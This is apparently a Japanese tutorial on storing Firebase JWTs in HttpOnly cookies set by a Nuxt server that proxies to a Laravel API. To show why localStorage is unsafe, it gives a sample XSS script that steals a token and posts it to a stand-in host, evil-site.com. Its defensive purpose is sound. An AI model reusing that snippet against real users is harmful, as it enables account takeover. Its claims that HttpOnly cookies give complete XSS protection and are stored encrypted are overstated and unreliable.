🤔 重要な質問への明確な回答

Q1: JWTトークンをHttpOnly Cookieで保有しているのは誰？

A1: 🌐 ブラウザが HttpOnly Cookie を保有しています

Q2: HttpOnly Cookieをブラウザに埋め込むのは誰？

A2: 🚀 Nuxt サーバーが setCookie() で埋め込みます

👥 HttpOnly Cookie の4つの関係者

🚀 Nuxt サーバー（設定者）

  • 役割: HttpOnly Cookieの設定・削除
  • 権限: 完全なCookie制御権
  • 機能:
  • • setCookie() でCookie設定
  • • getCookie() でCookie読み取り
  • • Cookie削除（ログアウト時）
  • • セキュリティ属性の管理
// Cookie設定（ログイン時） setCookie(event, 'auth_jwt', idToken, { httpOnly: true, // JS アクセス不可 secure: true, // HTTPS 必須 sameSite: 'lax', // CSRF 対策 maxAge: 3600 // 1時間有効 })

🌐 ブラウザ（保有者）

  • 役割: HttpOnly Cookieの安全な保管
  • 権限: 自動Cookie管理
  • 機能:
  • • HttpOnly Cookieの暗号化保存
  • • HTTP リクエスト時の自動送信
  • • JavaScript からのアクセス完全遮断
  • • 有効期限の自動管理
// ブラウザの自動動作 fetch('/api/posts', { method: 'POST', body: JSON.stringify({...}) }) // ↑ auth_jwt Cookie が自動で送信される // JavaScript からは見えないが正常動作

✅ 許可されたアクセス者

  • 🚀 Nuxt サーバー
  • • getCookie() でJWT取得
  • • Laravel APIへのプロキシ時に使用
  • 🌐 ブラウザ（内部処理）
  • • HTTP リクエスト時の自動付与
  • • セキュリティポリシーに従った管理
// Nuxt サーバーでの正当なアクセス export default defineEventHandler(async (event) => { const authJwt = getCookie(event, 'auth_jwt') if (authJwt) { // Laravel API にプロキシ return await proxyToLaravel(authJwt) } })

❌ アクセス拒否される者

  • 🌐 JavaScript（クライアント側）
  • • document.cookie で見えない
  • • localStorage にも保存されない
  • • XSS攻撃からの完全保護
  • 🌍 外部サイト
  • • SameSite属性により遮断
  • • CSRF攻撃の防止
// これらは全て失敗する（HttpOnly保護） console.log(document.cookie) // → auth_jwt は表示されない localStorage.getItem('auth_jwt') // → null（保存されていない） // 悪意あるスクリプトも JWT にアクセス不可 // XSS攻撃が成功してもトークンは盗めない

🔄 HttpOnly Cookie の完全なライフサイクル

1️⃣ Cookie設定フロー（ログイン時）

🌐 ブラウザ → 🔥 Firebase Auth
ユーザーがログイン → Firebase SDKが直接認証処理
// ブラウザ内JavaScript const userCredential = await signInWithEmailAndPassword(auth, email, password) const idToken = await userCredential.user.getIdToken() // この時点では JWT はメモリ内のみ（Cookie未設定）
🌐 ブラウザ → 🚀 Nuxt API
取得したJWTをNuxt API（/api/auth/login）に送信
// ブラウザからNuxt APIへ const response = await $fetch('/api/auth/login', { method: 'POST', body: { idToken: idToken } // JWT をサーバーに送信 })
🚀 Nuxt サーバー → 🔥 Firebase Auth
Nuxt サーバーがFirebase Admin SDKでJWT検証
// Nuxt サーバー内処理 const decodedToken = await admin.auth().verifyIdToken(idToken) // JWT の署名・有効期限を検証
🚀 Nuxt サーバー → 🌐 ブラウザ
検証成功時、HttpOnly Cookieを設定してレスポンス
// Nuxt サーバーがCookie設定 setCookie(event, 'auth_jwt', idToken, { httpOnly: true, // JavaScript アクセス不可に設定 secure: true, // HTTPS でのみ送信 sameSite: 'lax', // CSRF 攻撃対策 maxAge: 3600, // 1時間有効 path: '/' // 全パスで有効 }) // ブラウザは自動でこのCookieを保存する

2️⃣ Cookie利用フロー（API呼び出し時）

🌐 ブラウザ → 🚀 Nuxt API
投稿作成などのAPI呼び出し（Cookie自動送信）
// ブラウザから API 呼び出し const response = await $fetch('/api/posts', { method: 'POST', body: { content: '投稿内容' } }) // 重要：JavaScript からは auth_jwt Cookie は見えない // でもブラウザが自動で Cookie を送信する
🚀 Nuxt サーバー
HttpOnly CookieからJWTを取得
// Nuxt サーバーで Cookie 取得 const authJwt = getCookie(event, 'auth_jwt') if (!authJwt) { return { success: false, error: '認証が必要です' } } // サーバーサイドでのみ JWT にアクセス可能
🚀 Nuxt サーバー → ⚡ Laravel API
認証情報を含めてLaravelにプロキシ
// Laravel API へプロキシ const response = await $fetch('http://nginx/api/posts', { method: 'POST', headers: { 'Cookie': `auth_jwt=${authJwt}` // JWT を Laravel に転送 }, body: requestBody })

🛡️ セキュリティ比較：従来方式 vs HttpOnly Cookie

❌ 従来方式（JavaScriptアクセス可能）

脆弱性：

  • XSS攻撃に脆弱
  • 悪意あるスクリプトが JWT を盗める
  • localStorage/sessionStorage も危険
  • document.cookie で簡単にアクセス
// 危険な従来方式 localStorage.setItem('jwt', token) // ↑ XSS攻撃で簡単に盗まれる // 悪意あるスクリプト const stolenToken = localStorage.getItem('jwt') fetch('https://evil-site.com/steal', { method: 'POST', body: { token: stolenToken } }) // ↑ JWT が盗まれてアカウント乗っ取り

✅ HttpOnly Cookie方式

セキュリティ機能：

  • XSS攻撃完全防御
  • JavaScript からアクセス不可
  • CSRF攻撃も SameSite で防御
  • HTTPS強制でネットワーク保護
// セキュアなHttpOnly方式 // JWT はサーバーサイドでのみ管理 // 悪意あるスクリプトが実行されても... console.log(document.cookie) // ↑ auth_jwt は見えない（HttpOnly保護） localStorage.getItem('jwt') // ↑ null（保存されていない） // 攻撃者は JWT を盗むことができない！
